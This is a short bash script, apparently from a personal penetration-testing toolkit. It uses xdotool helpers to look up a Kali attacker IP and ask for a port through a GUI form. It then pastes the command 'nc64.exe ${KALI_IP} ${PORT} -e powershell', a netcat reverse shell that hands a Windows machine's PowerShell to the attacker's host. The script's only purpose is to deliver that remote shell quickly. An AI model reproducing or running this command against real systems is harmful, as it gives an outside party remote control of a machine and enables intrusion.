#!/bin/bash

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "port"

PORT=${form_data["port"]}

paste_command "nc64.exe ${KALI_IP} ${PORT} -e powershell"
